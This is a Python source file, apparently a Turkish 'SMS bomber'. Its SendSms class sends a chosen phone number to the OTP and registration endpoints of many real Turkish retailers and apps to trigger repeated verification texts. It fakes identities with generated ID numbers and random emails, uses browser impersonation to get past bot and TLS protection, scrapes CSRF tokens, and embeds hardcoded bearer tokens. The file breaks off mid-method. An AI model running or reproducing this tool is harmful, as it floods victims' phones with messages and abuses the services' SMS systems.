import requests
import re  # <--- BU EKSİKSE MAVİ VE BEYMEN ÇALIŞMAZ
from bs4 import BeautifulSoup
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style
from curl_cffi import requests as crequests # <--- BU EKSİKSE TLS BYPASS ÇALIŞMAZ

class SendSms():
    def __init__(self, phone, mail):
        self.adet = 0         # Başarılı SMS sayacı
        self.hedef = 10    
           # Maksimum kaç SMS gönderecek

        # Telefon ve mail ayarları
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append(sum(rakam[:10]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22)) + "@gmail.com"


    #kahvedunyasi.com
    def KahveDunyasi(self):
        if self.adet >= self.hedef:
            return True  

        try:    
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json={"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["processStatus"] == "Success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kahvedunyasi.com")
    def Beymen(self):
        try:
            # Beymen için TLS Bypass ve Session başlatma
            session = crequests.Session(impersonate="chrome120")
            
            # 1. Adım: Token yakalamak için ana sayfayı tara
            res_get = session.get("https://www.beymen.com/tr", timeout=10)
            
            token_patterns = [
                r'name=["\']__RequestVerificationToken["\'] type=["\']hidden["\'] value=["\'](.*?)["\']',
                r'RequestVerificationToken["\']?\s*[:=]\s*["\'](.*?)["\']',
                r'csrfToken["\']?\s*[:=]\s*["\'](.*?)["\']'
            ]
            
            csrf_token = None
            for pattern in token_patterns:
                match = re.search(pattern, res_get.text)
                if match:
                    csrf_token = match.group(1)
                    break
            
            # Ana sayfada yoksa kayıt sayfasını dene
            if not csrf_token:
                res_get = session.get("https://www.beymen.com/tr/customer/register", timeout=10)
                for pattern in token_patterns:
                    match = re.search(pattern, res_get.text)
                    if match:
                        csrf_token = match.group(1)
                        break

            if csrf_token:
                # 2. Adım: Payload ve Header hazırlığı
                payload = {
                    "CustomerName": "Ahmet Yilmaz",
                    "EmailAddress": self.mail,
                    "PhoneNumber": self.phone
                }
                headers = {
                    "Content-Type": "application/json",
                    "requestverificationtoken": csrf_token,
                    "x-requested-with": "XMLHttpRequest",
                    "referer": "https://www.beymen.com/tr/customer/register",
                    "origin": "https://www.beymen.com"
                }
                
                # 3. Adım: SMS Gönderimi
                api_url = "https://www.beymen.com/cop-api/customer/SendOtpMessageForNewCustomerPhoneVerification"
                r = session.post(api_url, json=payload, headers=headers, timeout=10)
                
                if r.status_code == 200 and '"Success":true' in r.text:
                    self.adet += 1
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Beymen Başarılı! --> {self.phone}")
                    return True
            return False
        except Exception:
            return False
    
    def Mavi(self):
        if self.adet >= self.hedef:
            return True 
        try:
            # Sınıf içindeki mail ve telefon değişkenlerini kullanıyoruz
            # impersonate="chrome120" ile Mavi'nin bot korumasını geçiyoruz
            session = crequests.Session(impersonate="chrome120")
            
            # 1. Adım: Kayıt sayfasına gir ve o saniyeye özel CSRFToken'ı al
            res_get = session.get("https://www.mavi.com/register", timeout=15)
            
            # HTML içinden tokenı yakalıyoruz
            token_match = re.search(r'name=["\']CSRFToken["\']\s+value=["\'](.*?)["\']', res_get.text)
            
            if token_match:
                csrf_token = token_match.group(1)
                
                payload = {
                    "firstName": "Ahmet",
                    "lastName": "Yilmaz",
                    "phoneNumber": self.phone,
                    "day": "01",
                    "month": "08",
                    "year": "1999",
                    "gender": "MALE",
                    "eMail": self.mail,
                    "password": "Passs1.4Aff",
                    "confirmPassword": "Passs1.4Aff",
                    "smsPermission": "true",
                    "emailPermission": "true",
                    "acceptAgreement": "false",
                    "CSRFToken": csrf_token
                }

                headers = {
                    "Accept": "*/*",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Referer": "https://www.mavi.com/register",
                    "Origin": "https://www.mavi.com"
                }

                # 2. Adım: POST isteği ile SMS'i tetikliyoruz
                r = session.post(
                    "https://www.mavi.com/register/newcustomer", 
                    data=payload, 
                    headers=headers, 
                    timeout=15
                )
                
                if r.status_code == 200:
                    self.adet += 1 # Başarılı olursa sayacı artır
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Mavi Başarılı! --> {self.phone}")
                    return True
                else:
                    return False
            else:
                return False

        except Exception:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Baglanti Sorunu! --> mavi.com.tr")
            return False
        

    #lcw.com
    def Lcw(self):
        if self.adet >= self.hedef:
            return True

        try:
            url = "https://www.lcw.com/uye-ol"
            headers = {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "x-requested-with": "XMLHttpRequest", # Bu çok kritik, AJAX isteği olduğunu belirtir
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                "origin": "https://www.lcw.com",
                "referer": "https://www.lcw.com/uye-ol"
            }
            
            # Rastgele şifre
            sifre = ''.join(choice(ascii_lowercase) for i in range(8)) + str(randint(100, 999))
            
            # LCW'nin istediği 5XX XXX XX XX formatı
            p = self.phone
            formatted_phone = f"{p[0:3]} {p[3:6]} {p[6:8]} {p[8:10]}"
            
            json_data = {
                "RegisterFormView": {
                    "RegisterPhoneNumber": formatted_phone,
                    "RegisterEmail": self.mail,
                    "Password": sifre,
                    "IsEmailChecked": False,
                    "IsSmsChecked": True,
                    "IsCallChecked": False,
                    "IsMemberPrivacyRequired": True,
                    "ActivationCode": "",
                    "Referer": None,
                    "CaptchaCode": "",
                    "PhoneAreaCode": "0090"
                }
            }
            
            response = requests.post(url, headers=headers, json=json_data, timeout=10)
            
            # Eğer status 200 ise ve cevap içeriğinde hata yoksa başarılıdır
            if response.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> lcw.com")
            else:
                # Durum kodunu da yazdıralım ki sorunu anlayalım
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! ({response.status_code}) {self.phone} --> lcw.com")
        except Exception as e:
            # Burası hata mesajını tam görmeni sağlar
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Hata! {e} --> lcw.com")


    def MadameCoco(self):
        if self.adet >= self.hedef:
            return True
        try:
            session = crequests.Session(impersonate="chrome124")
            
            # Token ve çerezleri topluyoruz
            r_gen = session.get("https://www.madamecoco.com/users/register/", timeout=10)
            csrf = session.cookies.get("csrftoken")
            
            if not csrf:
                return False

            p = self.phone
            if not p.startswith("0"): p = "0" + p
            
            # Filtreye takılmamak için her seferinde farklı veriler
            rand_name = ''.join(random.choices("abcdefgh", k=6))
            
            headers = {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "x-csrftoken": csrf,
                "referer": "https://www.madamecoco.com/users/register/",
                "x-requested-with": "XMLHttpRequest"
            }
            
            payload = {
                "email": f"{rand_name}@gmail.com",
                "first_name": "Ahmet",
                "last_name": "Yilmaz",
                "date_of_birth": "1995-05-15",
                "password": "Password123!",
                "phone": p,
                "sms_allowed": True,
                "confirm": True,
                "attributes": {"club": True, "kvkk_confirm": True}
            }
            
            r = session.post("https://www.madamecoco.com/users/register/", json=payload, headers=headers, timeout=12)
            
            # 202 kodunu da başarı listesine ekledik
            if r.status_code in [200, 201, 202, 204]:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Madame Coco Başarılı! --> {self.phone}")
                return True
            return False
        except Exception:
            return False  
            
              
    def Altinyildiz(self):
        if self.adet >= self.hedef:
            return True
        try:
            # GSM parametresini direkt URL içine gömüyoruz
            url = f"https://www.altinyildizclassics.com/customer/RegisterSendOtpForGsmJson?gsm={self.phone}"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.altinyildizclassics.com/login"
            }
            
            # Parametre URL'de olduğu için data kısmını boş veya basit bir dict gönderebiliriz
            response = requests.post(url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> altinyildiz.com.tr")
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> altinyildiz.com.tr")

    def Defacto(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://www.defacto.com.tr/Customer/SendRegisterPhoneConfirmationSms"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.defacto.com.tr/Login"
            }
            # cURL'den ayıkladığım data yapısı
            data = {
                "mobilePhone": f"0{self.phone}",
                "email": self.mail,
                "__RequestVerificationToken": "", # Boş bırakıldığında bazen sistem varsayılana düşer
                "recaptchaToken": "" 
            }
            response = requests.post(url, data=data, headers=headers, timeout=5)
            
            if response.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> defacto.com.tr")
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> defacto.com.tr")

    def HopiWeb(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://hopi.com.tr/"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "text/plain;charset=UTF-8",
                "Next-Action": "00b77a994649a1dac9613aa2ae77c96bc42f0d87", # cURL'den gelen token
                "Origin": "https://hopi.com.tr",
                "Referer": "https://hopi.com.tr/"
            }
            # cURL'de veri [5073820261] şeklinde gidiyor
            payload = f"[{self.phone}]"
            
            response = requests.post(url, data=payload, headers=headers, timeout=5)
            
            if response.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> hopi.com.tr (Web)")
                self.adet += 1
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> hopi.com.tr (Web)")

    #wmf.com.tr
    def Wmf(self):
        if self.adet >= self.hedef:
            return True
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
    
    #bim
    def Bim(self):
        if self.adet >= self.hedef:
            return True
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")


    #englishhome.com
    def Englishhome(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Referer": "https://www.englishhome.com/", "Content-Type": "application/json", "Origin": "https://www.englishhome.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers"}
            json={"Phone": self.phone, "XID": ""}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isError"] == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
          

    #suiste.com
    def Suiste(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "Accept": "application/json", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Language": "en", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Encoding": "gzip, deflate, br", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1", "X-Mobillium-Os-Version": "15.8.3", "X-Mobillium-App-Version": "1.7.11"}
            data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
                
    
    #KimGbIster
    def KimGb(self):
        if self.adet >= self.hedef:
            return True
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
            
    
    #evidea.com
    def Evidea(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com") 


    #345dijital.com
    def Ucdortbes(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
            json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.345dijital.com")
            else:
                raise
        except:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.345dijital.com")
            self.adet += 1


    #tiklagelsin.com
    def TiklaGelsin(self):
        if self.adet >= self.hedef:
            return True
        try:
            session = crequests.Session(impersonate="chrome124")
            
            url = "https://api.tiklagelsin.com/tg/user/api/v1/auth/generate-otp"
            
            headers = {
                "accept": "application/json;charset=utf-8",
                "app-version": "4.0.0",
                "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkaWQiOiJjMjEwNDYzZC03OGEwLTRiMTMtOWE2OS03MWI5YTZlYzA3OGYiLCJuYmYiOjE3NzA1NjAzNjAsImV4cCI6MTgwMjA5NjM2MCwiaWF0IjoxNzcwNTYwMzYwLCJpc3MiOiJJc3N1ZXJJbmZvcm1hdGlvbiIsImF1ZCI6IkF1ZGllbmNlSW5mb3JtYXRpb24ifQ.fUukhxr1rAXf_2XE9CBbfQbYo6QIkRvGZoLtQGg1k3E",
                "correlation-id": "87e93790-0d2d-476e-a617-71a5f7c9d226",
                "device-type": "2",
                "tenant-id": "9737ce1e-8d97-431c-b884-3250781af72f",
                "origin": "https://www.tiklagelsin.com",
                "referer": "https://www.tiklagelsin.com/",
                "content-type": "application/json"
            }

            p = self.phone
            if p.startswith("0"): p = p[1:]
            if p.startswith("90"): p = p[2:]

            payload = {
                "phoneNumber": p,
                "countryCode": "+90",
                "secret": p
            }

            r = session.post(url, json=payload, headers=headers, timeout=15)
            
            if r.status_code in [200, 201]:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Tıkla Gelsin Başarılı! --> {self.phone}")
                return True
            return False
        except Exception:
            return False


    #naosstars.com
    def Naosstars(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
            json={"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")


    #koton.com
    def Koton(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-Project-Name": "rn-env", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.koton.com/", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")


    #hayatsu.com.tr
    def Hayatsu(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.hayatsu.com.tr/", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM", "Origin": "https://www.hayatsu.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers"}
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["is_success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hayatsu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hayatsu.com.tr")


    #hizliecza.com.tr
    def Hizliecza(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "hizliecza/31 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9", "Authorization": "Bearer null"}
            json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.hizliecza.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.hizliecza.net")


    #metro-tr.com
    def Metro(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate, br", "Applicationversion": "2.4.1", "Applicationplatform": "2", "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
            json={"methodType": "2", "mobilePhoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["status"] == "success":
